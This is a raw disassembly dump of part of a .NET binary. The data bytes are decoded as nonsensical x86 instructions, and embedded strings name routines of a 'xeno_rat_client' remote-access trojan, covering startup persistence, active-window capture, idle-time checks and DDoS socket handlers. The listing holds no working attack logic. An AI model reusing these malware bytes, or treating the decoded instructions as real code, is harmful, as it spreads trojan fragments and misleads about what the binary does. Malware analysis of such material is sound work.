  40c2f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2f3:	65 63 74 53 75       	arpl   %esi,%gs:0x75(%ebx,%edx,2)
  40c2f8:	62 53 6f             	bound  %edx,0x6f(%ebx)
  40c2fb:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40c2fe:	73 79                	jae    0x40c379
  40c300:	6e                   	outsb  %ds:(%esi),(%dx)
  40c301:	63 3e                	arpl   %edi,(%esi)
  40c303:	64 5f                	fs pop %edi
  40c305:	5f                   	pop    %edi
  40c306:	31 31                	xor    %esi,(%ecx)
  40c308:	00 00                	add    %al,(%eax)
  40c30a:	2d 01 00 28 78       	sub    $0x78280001,%eax
  40c30f:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c311:	6f                   	outsl  %ds:(%esi),(%dx)
  40c312:	5f                   	pop    %edi
  40c313:	72 61                	jb     0x40c376
  40c315:	74 5f                	je     0x40c376
  40c317:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c31b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c31c:	74 2e                	je     0x40c34c
  40c31e:	4e                   	dec    %esi
  40c31f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c320:	64 65 2b 3c 52       	fs sub %gs:(%edx,%edx,2),%edi
  40c325:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40c329:	76 65                	jbe    0x40c390
  40c32b:	41                   	inc    %ecx
  40c32c:	73 79                	jae    0x40c3a7
  40c32e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c32f:	63 3e                	arpl   %edi,(%esi)
  40c331:	64 5f                	fs pop %edi
  40c333:	5f                   	pop    %edi
  40c334:	31 33                	xor    %esi,(%ebx)
  40c336:	00 00                	add    %al,(%eax)
  40c338:	2a 01                	sub    (%ecx),%al
  40c33a:	00 25 78 65 6e 6f    	add    %ah,0x6f6e6578
  40c340:	5f                   	pop    %edi
  40c341:	72 61                	jb     0x40c3a4
  40c343:	74 5f                	je     0x40c3a4
  40c345:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c349:	6e                   	outsb  %ds:(%esi),(%dx)
  40c34a:	74 2e                	je     0x40c37a
  40c34c:	4e                   	dec    %esi
  40c34d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c34e:	64 65 2b 3c 53       	fs sub %gs:(%ebx,%edx,2),%edi
  40c353:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c355:	64 41                	fs inc %ecx
  40c357:	73 79                	jae    0x40c3d2
  40c359:	6e                   	outsb  %ds:(%esi),(%dx)
  40c35a:	63 3e                	arpl   %edi,(%esi)
  40c35c:	64 5f                	fs pop %edi
  40c35e:	5f                   	pop    %edi
  40c35f:	31 34 00             	xor    %esi,(%eax,%eax,1)
  40c362:	00 32                	add    %dh,(%edx)
  40c364:	01 00                	add    %eax,(%eax)
  40c366:	2d 78 65 6e 6f       	sub    $0x6f6e6578,%eax
  40c36b:	5f                   	pop    %edi
  40c36c:	72 61                	jb     0x40c3cf
  40c36e:	74 5f                	je     0x40c3cf
  40c370:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c374:	6e                   	outsb  %ds:(%esi),(%dx)
  40c375:	74 2e                	je     0x40c3a5
  40c377:	4e                   	dec    %esi
  40c378:	6f                   	outsl  %ds:(%esi),(%dx)
  40c379:	64 65 2b 3c 41       	fs sub %gs:(%ecx,%eax,2),%edi
  40c37e:	75 74                	jne    0x40c3f4
  40c380:	68 65 6e 74 69       	push   $0x69746e65
  40c385:	63 61 74             	arpl   %esp,0x74(%ecx)
  40c388:	65 41                	gs inc %ecx
  40c38a:	73 79                	jae    0x40c405
  40c38c:	6e                   	outsb  %ds:(%esi),(%dx)
  40c38d:	63 3e                	arpl   %edi,(%esi)
  40c38f:	64 5f                	fs pop %edi
  40c391:	5f                   	pop    %edi
  40c392:	31 38                	xor    %edi,(%eax)
  40c394:	00 00                	add    %al,(%eax)
  40c396:	42                   	inc    %edx
  40c397:	01 00                	add    %eax,(%eax)
  40c399:	3d 78 65 6e 6f       	cmp    $0x6f6e6578,%eax
  40c39e:	5f                   	pop    %edi
  40c39f:	72 61                	jb     0x40c402
  40c3a1:	74 5f                	je     0x40c402
  40c3a3:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c3a7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3a8:	74 2e                	je     0x40c3d8
  40c3aa:	53                   	push   %ebx
  40c3ab:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3ac:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40c3af:	74 48                	je     0x40c3f9
  40c3b1:	61                   	popa
  40c3b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3b3:	64 6c                	fs insb (%dx),%es:(%edi)
  40c3b5:	65 72 2b             	gs jb  0x40c3e3
  40c3b8:	3c 52                	cmp    $0x52,%al
  40c3ba:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40c3be:	6c                   	insb   (%dx),%es:(%edi)
  40c3bf:	6c                   	insb   (%dx),%es:(%edi)
  40c3c0:	41                   	inc    %ecx
  40c3c1:	73 79                	jae    0x40c43c
  40c3c3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3c4:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40c3c7:	64 6f                	outsl  %fs:(%esi),(%dx)
  40c3c9:	73 5f                	jae    0x40c42a
  40c3cb:	75 6e                	jne    0x40c43b
  40c3cd:	73 61                	jae    0x40c430
  40c3cf:	66 65 72 3e          	data16 gs jb 0x40c411
  40c3d3:	64 5f                	fs pop %edi
  40c3d5:	5f                   	pop    %edi
  40c3d6:	34 00                	xor    $0x0,%al
  40c3d8:	00 40 01             	add    %al,0x1(%eax)
  40c3db:	00 3b                	add    %bh,(%ebx)
  40c3dd:	78 65                	js     0x40c444
  40c3df:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3e0:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3e1:	5f                   	pop    %edi
  40c3e2:	72 61                	jb     0x40c445
  40c3e4:	74 5f                	je     0x40c445
  40c3e6:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c3ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3eb:	74 2e                	je     0x40c41b
  40c3ed:	53                   	push   %ebx
  40c3ee:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3ef:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40c3f2:	74 48                	je     0x40c43c
  40c3f4:	61                   	popa
  40c3f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3f6:	64 6c                	fs insb (%dx),%es:(%edi)
  40c3f8:	65 72 2b             	gs jb  0x40c426
  40c3fb:	3c 52                	cmp    $0x52,%al
  40c3fd:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40c401:	6c                   	insb   (%dx),%es:(%edi)
  40c402:	6c                   	insb   (%dx),%es:(%edi)
  40c403:	41                   	inc    %ecx
  40c404:	73 79                	jae    0x40c47f
  40c406:	6e                   	outsb  %ds:(%esi),(%dx)
  40c407:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40c40a:	64 6f                	outsl  %fs:(%esi),(%dx)
  40c40c:	73 5f                	jae    0x40c46d
  40c40e:	73 61                	jae    0x40c471
  40c410:	66 65 72 3e          	data16 gs jb 0x40c452
  40c414:	64 5f                	fs pop %edi
  40c416:	5f                   	pop    %edi
  40c417:	35 00 00 32 01       	xor    $0x1320000,%eax
  40c41c:	00 2d 78 65 6e 6f    	add    %ch,0x6f6e6578
  40c422:	5f                   	pop    %edi
  40c423:	72 61                	jb     0x40c486
  40c425:	74 5f                	je     0x40c486
  40c427:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c42b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c42c:	74 2e                	je     0x40c45c
  40c42e:	53                   	push   %ebx
  40c42f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c430:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40c433:	74 48                	je     0x40c47d
  40c435:	61                   	popa
  40c436:	6e                   	outsb  %ds:(%esi),(%dx)
  40c437:	64 6c                	fs insb (%dx),%es:(%edi)
  40c439:	65 72 2b             	gs jb  0x40c467
  40c43c:	3c 53                	cmp    $0x53,%al
  40c43e:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c440:	64 41                	fs inc %ecx
  40c442:	73 79                	jae    0x40c4bd
  40c444:	6e                   	outsb  %ds:(%esi),(%dx)
  40c445:	63 3e                	arpl   %edi,(%esi)
  40c447:	64 5f                	fs pop %edi
  40c449:	5f                   	pop    %edi
  40c44a:	39 00                	cmp    %eax,(%eax)
  40c44c:	00 36                	add    %dh,(%esi)
  40c44e:	01 00                	add    %eax,(%eax)
  40c450:	31 78 65             	xor    %edi,0x65(%eax)
  40c453:	6e                   	outsb  %ds:(%esi),(%dx)
  40c454:	6f                   	outsl  %ds:(%esi),(%dx)
  40c455:	5f                   	pop    %edi
  40c456:	72 61                	jb     0x40c4b9
  40c458:	74 5f                	je     0x40c4b9
  40c45a:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c45e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c45f:	74 2e                	je     0x40c48f
  40c461:	53                   	push   %ebx
  40c462:	6f                   	outsl  %ds:(%esi),(%dx)
  40c463:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40c466:	74 48                	je     0x40c4b0
  40c468:	61                   	popa
  40c469:	6e                   	outsb  %ds:(%esi),(%dx)
  40c46a:	64 6c                	fs insb (%dx),%es:(%edi)
  40c46c:	65 72 2b             	gs jb  0x40c49a
  40c46f:	3c 52                	cmp    $0x52,%al
  40c471:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40c475:	76 65                	jbe    0x40c4dc
  40c477:	41                   	inc    %ecx
  40c478:	73 79                	jae    0x40c4f3
  40c47a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c47b:	63 3e                	arpl   %edi,(%esi)
  40c47d:	64 5f                	fs pop %edi
  40c47f:	5f                   	pop    %edi
  40c480:	31 30                	xor    %esi,(%eax)
  40c482:	00 00                	add    %al,(%eax)
  40c484:	28 01                	sub    %al,(%ecx)
  40c486:	00 23                	add    %ah,(%ebx)
  40c488:	78 65                	js     0x40c4ef
  40c48a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c48b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c48c:	5f                   	pop    %edi
  40c48d:	72 61                	jb     0x40c4f0
  40c48f:	74 5f                	je     0x40c4f0
  40c491:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c495:	6e                   	outsb  %ds:(%esi),(%dx)
  40c496:	74 2e                	je     0x40c4c6
  40c498:	50                   	push   %eax
  40c499:	72 6f                	jb     0x40c50a
  40c49b:	67 72 61             	addr16 jb 0x40c4ff
  40c49e:	6d                   	insl   (%dx),%es:(%edi)
  40c49f:	2b 3c 4d 61 69 6e 3e 	sub    0x3e6e6961(,%ecx,2),%edi
  40c4a6:	64 5f                	fs pop %edi
  40c4a8:	5f                   	pop    %edi
  40c4a9:	31 31                	xor    %esi,(%ecx)
  40c4ab:	00 00                	add    %al,(%eax)
  40c4ad:	3e 01 00             	add    %eax,%ds:(%eax)
  40c4b0:	39 78 65             	cmp    %edi,0x65(%eax)
  40c4b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4b5:	5f                   	pop    %edi
  40c4b6:	72 61                	jb     0x40c519
  40c4b8:	74 5f                	je     0x40c519
  40c4ba:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c4be:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4bf:	74 2e                	je     0x40c4ef
  40c4c1:	55                   	push   %ebp
  40c4c2:	74 69                	je     0x40c52d
  40c4c4:	6c                   	insb   (%dx),%es:(%edi)
  40c4c5:	73 2b                	jae    0x40c4f2
  40c4c7:	3c 47                	cmp    $0x47,%al
  40c4c9:	65 74 43             	gs je  0x40c50f
  40c4cc:	61                   	popa
  40c4cd:	70 74                	jo     0x40c543
  40c4cf:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  40c4d6:	74 69                	je     0x40c541
  40c4d8:	76 65                	jbe    0x40c53f
  40c4da:	57                   	push   %edi
  40c4db:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  40c4e2:	79 6e                	jns    0x40c552
  40c4e4:	63 3e                	arpl   %edi,(%esi)
  40c4e6:	64 5f                	fs pop %edi
  40c4e8:	5f                   	pop    %edi
  40c4e9:	38 00                	cmp    %al,(%eax)
  40c4eb:	00 36                	add    %dh,(%esi)
  40c4ed:	01 00                	add    %eax,(%eax)
  40c4ef:	31 78 65             	xor    %edi,0x65(%eax)
  40c4f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4f4:	5f                   	pop    %edi
  40c4f5:	72 61                	jb     0x40c558
  40c4f7:	74 5f                	je     0x40c558
  40c4f9:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c4fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4fe:	74 2e                	je     0x40c52e
  40c500:	55                   	push   %ebp
  40c501:	74 69                	je     0x40c56c
  40c503:	6c                   	insb   (%dx),%es:(%edi)
  40c504:	73 2b                	jae    0x40c531
  40c506:	3c 43                	cmp    $0x43,%al
  40c508:	6f                   	outsl  %ds:(%esi),(%dx)
  40c509:	6e                   	outsb  %ds:(%esi),(%dx)
  40c50a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c50b:	65 63 74 41 6e       	arpl   %esi,%gs:0x6e(%ecx,%eax,2)
  40c510:	64 53                	fs push %ebx
  40c512:	65 74 75             	gs je  0x40c58a
  40c515:	70 41                	jo     0x40c558
  40c517:	73 79                	jae    0x40c592
  40c519:	6e                   	outsb  %ds:(%esi),(%dx)
  40c51a:	63 3e                	arpl   %edi,(%esi)
  40c51c:	64 5f                	fs pop %edi
  40c51e:	5f                   	pop    %edi
  40c51f:	31 35 00 00 2f 01    	xor    %esi,0x12f0000
  40c525:	00 2a                	add    %ch,(%edx)
  40c527:	78 65                	js     0x40c58e
  40c529:	6e                   	outsb  %ds:(%esi),(%dx)
  40c52a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c52b:	5f                   	pop    %edi
  40c52c:	72 61                	jb     0x40c58f
  40c52e:	74 5f                	je     0x40c58f
  40c530:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c534:	6e                   	outsb  %ds:(%esi),(%dx)
  40c535:	74 2e                	je     0x40c565
  40c537:	55                   	push   %ebp
  40c538:	74 69                	je     0x40c5a3
  40c53a:	6c                   	insb   (%dx),%es:(%edi)
  40c53b:	73 2b                	jae    0x40c568
  40c53d:	3c 52                	cmp    $0x52,%al
  40c53f:	65 6d                	gs insl (%dx),%es:(%edi)
  40c541:	6f                   	outsl  %ds:(%esi),(%dx)
  40c542:	76 65                	jbe    0x40c5a9
  40c544:	53                   	push   %ebx
  40c545:	74 61                	je     0x40c5a8
  40c547:	72 74                	jb     0x40c5bd
  40c549:	75 70                	jne    0x40c5bb
  40c54b:	3e 64 5f             	ds fs pop %edi
  40c54e:	5f                   	pop    %edi
  40c54f:	31 36                	xor    %esi,(%esi)
  40c551:	00 00                	add    %al,(%eax)
  40c553:	2b 01                	sub    (%ecx),%eax
  40c555:	00 26                	add    %ah,(%esi)
  40c557:	78 65                	js     0x40c5be
  40c559:	6e                   	outsb  %ds:(%esi),(%dx)
  40c55a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55b:	5f                   	pop    %edi
  40c55c:	72 61                	jb     0x40c5bf
  40c55e:	74 5f                	je     0x40c5bf
  40c560:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c564:	6e                   	outsb  %ds:(%esi),(%dx)
  40c565:	74 2e                	je     0x40c595
  40c567:	55                   	push   %ebp
  40c568:	74 69                	je     0x40c5d3
  40c56a:	6c                   	insb   (%dx),%es:(%edi)
  40c56b:	73 2b                	jae    0x40c598
  40c56d:	3c 55                	cmp    $0x55,%al
  40c56f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c570:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  40c577:	3e 64 5f             	ds fs pop %edi
  40c57a:	5f                   	pop    %edi
  40c57b:	31 37                	xor    %esi,(%edi)
  40c57d:	00 00                	add    %al,(%eax)
  40c57f:	36 01 00             	add    %eax,%ss:(%eax)
  40c582:	31 78 65             	xor    %edi,0x65(%eax)
  40c585:	6e                   	outsb  %ds:(%esi),(%dx)
  40c586:	6f                   	outsl  %ds:(%esi),(%dx)
  40c587:	5f                   	pop    %edi
  40c588:	72 61                	jb     0x40c5eb
  40c58a:	74 5f                	je     0x40c5eb
  40c58c:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c590:	6e                   	outsb  %ds:(%esi),(%dx)
  40c591:	74 2e                	je     0x40c5c1
  40c593:	55                   	push   %ebp
  40c594:	74 69                	je     0x40c5ff
  40c596:	6c                   	insb   (%dx),%es:(%edi)
  40c597:	73 2b                	jae    0x40c5c4
  40c599:	3c 41                	cmp    $0x41,%al
  40c59b:	64 64 54             	fs fs push %esp
  40c59e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c59f:	53                   	push   %ebx
  40c5a0:	74 61                	je     0x40c603
  40c5a2:	72 74                	jb     0x40c618
  40c5a4:	75 70                	jne    0x40c616
  40c5a6:	4e                   	dec    %esi
  40c5a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5a8:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5a9:	41                   	inc    %ecx
  40c5aa:	64 6d                	fs insl (%dx),%es:(%edi)
  40c5ac:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40c5b3:	38 00                	cmp    %al,(%eax)
  40c5b5:	00 33                	add    %dh,(%ebx)
  40c5b7:	01 00                	add    %eax,(%eax)
  40c5b9:	2e 78 65             	js,pn  0x40c621
  40c5bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5be:	5f                   	pop    %edi
  40c5bf:	72 61                	jb     0x40c622
  40c5c1:	74 5f                	je     0x40c622
  40c5c3:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c5c7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5c8:	74 2e                	je     0x40c5f8
  40c5ca:	55                   	push   %ebp
  40c5cb:	74 69                	je     0x40c636
  40c5cd:	6c                   	insb   (%dx),%es:(%edi)
  40c5ce:	73 2b                	jae    0x40c5fb
  40c5d0:	3c 41                	cmp    $0x41,%al
  40c5d2:	64 64 54             	fs fs push %esp
  40c5d5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5d6:	53                   	push   %ebx
  40c5d7:	74 61                	je     0x40c63a
  40c5d9:	72 74                	jb     0x40c64f
  40c5db:	75 70                	jne    0x40c64d
  40c5dd:	41                   	inc    %ecx
  40c5de:	64 6d                	fs insl (%dx),%es:(%edi)
  40c5e0:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40c5e7:	39 00                	cmp    %eax,(%eax)
  40c5e9:	00 32                	add    %dh,(%edx)
  40c5eb:	01 00                	add    %eax,(%eax)
  40c5ed:	2d 78 65 6e 6f       	sub    $0x6f6e6578,%eax
  40c5f2:	5f                   	pop    %edi
  40c5f3:	72 61                	jb     0x40c656
  40c5f5:	74 5f                	je     0x40c656
  40c5f7:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c5fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5fc:	74 2e                	je     0x40c62c
  40c5fe:	55                   	push   %ebp
  40c5ff:	74 69                	je     0x40c66a
  40c601:	6c                   	insb   (%dx),%es:(%edi)
  40c602:	73 2b                	jae    0x40c62f
  40c604:	3c 47                	cmp    $0x47,%al
  40c606:	65 74 49             	gs je  0x40c652
  40c609:	64 6c                	fs insb (%dx),%es:(%edi)
  40c60b:	65 54                	gs push %esp
  40c60d:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  40c614:	63 3e                	arpl   %edi,(%esi)
  40c616:	64 5f                	fs pop %edi
  40c618:	5f                   	pop    %edi
  40c619:	32 30                	xor    (%eax),%dh
  40c61b:	00 00                	add    %al,(%eax)
  40c61d:	08 07                	or     %al,(%edi)
  40c61f:	05 1d 05 09 09       	add    $0x909051d,%eax
  40c624:	08 18                	or     %bl,(%eax)
  40c626:	04 20                	add    $0x20,%al
  40c628:	01 01                	add    %eax,(%ecx)
  40c62a:	0a 09                	or     (%ecx),%cl
  40c62c:	10 01                	adc    %al,(%ecx)
  40c62e:	02 01                	add    (%ecx),%al
  40c630:	10 1d 1e 00 08 03    	adc    %bl,0x308001e
  40c636:	0a 01                	or     (%ecx),%al
  40c638:	05 05 07 02 08       	add    $0x8020705,%eax
  40c63d:	1d 05 07 15 12       	sbb    $0x12150705,%eax
  40c642:	09 02                	or     %eax,(%edx)
  40c644:	0e                   	push   %cs
  40c645:	12 0d 05 00 00 12    	adc    0x12000005,%cl
  40c64b:	80 c5 05             	add    $0x5,%ch
  40c64e:	20 02                	and    %al,(%edx)
  40c650:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c653:	06                   	push   %es
  40c654:	20 01                	and    %al,(%ecx)
  40c656:	01 12                	add    %edx,(%edx)
  40c658:	80 c9 04             	or     $0x4,%cl
  40c65b:	07                   	pop    %es
  40c65c:	01 11                	add    %edx,(%ecx)
  40c65e:	10 04 00             	adc    %al,(%eax,%eax,1)
  40c661:	00 11                	add    %dl,(%ecx)
  40c663:	21 07                	and    %eax,(%edi)
  40c665:	30 01                	xor    %al,(%ecx)
  40c667:	01 01                	add    %eax,(%ecx)
  40c669:	10 1e                	adc    %bl,(%esi)
  40c66b:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c66e:	01 11                	add    %edx,(%ecx)
  40c670:	10 05 00 02 02 0e    	adc    %al,0xe020200
  40c676:	0e                   	push   %cs
  40c677:	04 00                	add    $0x0,%al
  40c679:	00 12                	add    %dl,(%edx)
  40c67b:	0d 1c 07 0b 08       	or     $0x80b071c,%eax
  40c680:	12 0c 1d 05 1c 15 11 	adc    0x11151c05(,%ebx,1),%cl
  40c687:	25 01 1d 05 1d       	and    $0x1d051d01,%eax
  40c68c:	05 15 11 25 01       	add    $0x1251115,%eax
  40c691:	02 11                	add    (%ecx),%dl
  40c693:	29 12                	sub    %edx,(%edx)
  40c695:	2d 08 12 2d 06       	sub    $0x62d1208,%eax
  40c69a:	15 12 39 01 1d       	adc    $0x1d013912,%eax
  40c69f:	05 08 20 00 15       	add    $0x15002008,%eax
  40c6a4:	11 25 01 13 00 06    	adc    %esp,0x6001301
  40c6aa:	15 11 25 01 1d       	adc    $0x1d012511,%eax
  40c6af:	05 0a 30 02 02       	add    $0x202300a,%eax
  40c6b4:	01 10                	add    %edx,(%eax)
  40c6b6:	1e                   	push   %ds
  40c6b7:	00 10                	add    %dl,(%eax)
  40c6b9:	1e                   	push   %ds
  40c6ba:	01 0a                	add    %ecx,(%edx)
  40c6bc:	0a 02                	or     (%edx),%al
  40c6be:	15 11 25 01 1d       	adc    $0x1d012511,%eax
  40c6c3:	05 11 10 04 20       	add    $0x20041011,%eax
  40c6c8:	00 13                	add    %dl,(%ebx)
  40c6ca:	00 04 00             	add    %al,(%eax,%eax,1)
  40c6cd:	00 12                	add    %dl,(%edx)
  40c6cf:	61                   	popa
  40c6d0:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  40c6d5:	05 04 00 01 01       	add    $0x1010004,%eax
  40c6da:	0e                   	push   %cs
  40c6db:	05 20 01 02 13       	add    $0x13020120,%eax
  40c6e0:	00 05 15 12 39 01    	add    %al,0x1391215
  40c6e6:	02 05 15 11 25 01    	add    0x1251115,%al
  40c6ec:	02 09                	add    (%ecx),%cl
  40c6ee:	0a 02                	or     (%edx),%al
  40c6f0:	15 11 25 01 02       	adc    $0x2012511,%eax
  40c6f5:	11 10                	adc    %edx,(%eax)
  40c6f7:	04 00                	add    $0x0,%al
  40c6f9:	01 01                	add    %eax,(%ecx)
  40c6fb:	08 06                	or     %al,(%esi)
  40c6fd:	00 01                	add    %al,(%ecx)
  40c6ff:	12 0d 1d 05 07 20    	adc    0x2007051d,%cl
  40c705:	02 01                	add    (%ecx),%al
  40c707:	13 00                	adc    (%eax),%eax
  40c709:	13 01                	adc    (%ecx),%eax
  40c70b:	06                   	push   %es
  40c70c:	20 01                	and    %al,(%ecx)
  40c70e:	13 01                	adc    (%ecx),%eax
  40c710:	13 00                	adc    (%eax),%eax
  40c712:	06                   	push   %es
  40c713:	20 01                	and    %al,(%ecx)
  40c715:	12 80 ad 0e 06 00    	adc    0x60ead(%eax),%al
  40c71b:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c71e:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  40c725:	ad                   	lods   %ds:(%esi),%eax
  40c726:	09 20                	or     %esp,(%eax)
  40c728:	02 12                	add    (%edx),%dl
  40c72a:	80 dd 0e             	sbb    $0xe,%ch
  40c72d:	11 80 e1 06 20 02    	adc    %eax,0x22006e1(%eax)
  40c733:	1c 1c                	sbb    $0x1c,%al
  40c735:	1d 1c 04 20 00       	sbb    $0x20041c,%eax
  40c73a:	11 29                	adc    %ebp,(%ecx)
  40c73c:	06                   	push   %es
  40c73d:	0a 02                	or     (%edx),%al
  40c73f:	11 29                	adc    %ebp,(%ecx)
  40c741:	11 10                	adc    %edx,(%eax)
  40c743:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40c748:	0e                   	push   %cs
  40c749:	05 20 01 01 12       	add    $0x12010120,%eax
  40c74e:	2d 12 07 06 1d       	sub    $0x1d060712,%eax
  40c753:	05 1d 05 12 80       	add    $0x8012051d,%eax
  40c758:	e9 12 80 ed 12       	jmp    0x132e476f
  40c75d:	80 f1 12             	xor    $0x12,%cl
  40c760:	80 f5 05             	xor    $0x5,%ch
  40c763:	00 00                	add    %al,(%eax)
  40c765:	12 80 e9 05 20 01    	adc    0x12005e9(%eax),%al
  40c76b:	01 1d 05 04 20 00    	add    %ebx,0x200405
  40c771:	1d 05 09 20 02       	sbb    $0x2200905,%eax
  40c776:	12 80 ed 1d 05 1d    	adc    0x1d051ded(%eax),%al
  40c77c:	05 0c 20 03 01       	add    $0x103200c,%eax
  40c781:	12 80 fd 12 80 ed    	adc    -0x127fed03(%eax),%al
  40c787:	11 81 01 07 20 03    	adc    %eax,0x3200701(%ecx)
  40c78d:	01 1d 05 08 08 04    	add    %ebx,0x4080805
  40c793:	07                   	pop    %es
  40c794:	01 11                	add    %edx,(%ecx)
  40c796:	1c 04                	sbb    $0x4,%al
  40c798:	0a 01                	or     (%ecx),%al
  40c79a:	11 1c 04             	adc    %ebx,(%esp,%eax,1)
  40c79d:	07                   	pop    %es
  40c79e:	01 11                	add    %edx,(%ecx)
  40c7a0:	24 04                	and    $0x4,%al
  40c7a2:	0a 01                	or     (%ecx),%al
  40c7a4:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c7a7:	07                   	pop    %es
  40c7a8:	01 11                	add    %edx,(%ecx)
  40c7aa:	2c 04                	sub    $0x4,%al
  40c7ac:	0a 01                	or     (%ecx),%al
  40c7ae:	11 2c 04             	adc    %ebp,(%esp,%eax,1)
  40c7b1:	07                   	pop    %es
  40c7b2:	01 11                	add    %edx,(%ecx)
  40c7b4:	30 04 0a             	xor    %al,(%edx,%ecx,1)
  40c7b7:	01 11                	add    %edx,(%ecx)
  40c7b9:	30 04 07             	xor    %al,(%edi,%eax,1)
  40c7bc:	01 11                	add    %edx,(%ecx)
  40c7be:	38 04 0a             	cmp    %al,(%edx,%ecx,1)
  40c7c1:	01 11                	add    %edx,(%ecx)
  40c7c3:	38 04 07             	cmp    %al,(%edi,%eax,1)
  40c7c6:	01 11                	add    %edx,(%ecx)
  40c7c8:	34 04                	xor    $0x4,%al
  40c7ca:	0a 01                	or     (%ecx),%al
  40c7cc:	11 34 04             	adc    %esi,(%esp,%eax,1)
  40c7cf:	07                   	pop    %es
  40c7d0:	01 11                	add    %edx,(%ecx)
  40c7d2:	20 04 0a             	and    %al,(%edx,%ecx,1)
  40c7d5:	01 11                	add    %edx,(%ecx)
  40c7d7:	20 04 07             	and    %al,(%edi,%eax,1)
  40c7da:	01 11                	add    %edx,(%ecx)
  40c7dc:	28 04 0a             	sub    %al,(%edx,%ecx,1)
  40c7df:	01 11                	add    %edx,(%ecx)
  40c7e1:	28 13                	sub    %dl,(%ebx)
  40c7e3:	07                   	pop    %es
  40c7e4:	08 08                	or     %cl,(%eax)
  40c7e6:	12 18                	adc    (%eax),%bl
  40c7e8:	08 08                	or     %cl,(%eax)
  40c7ea:	12 3c 15 11 25 01 12 	adc    0x12012511(,%edx,1),%bh
  40c7f1:	3c 11                	cmp    $0x11,%al
  40c7f3:	29 12                	sub    %edx,(%edx)
  40c7f5:	2d 06 15 12 31       	sub    $0x31121506,%eax
  40c7fa:	01 12                	add    %edx,(%edx)
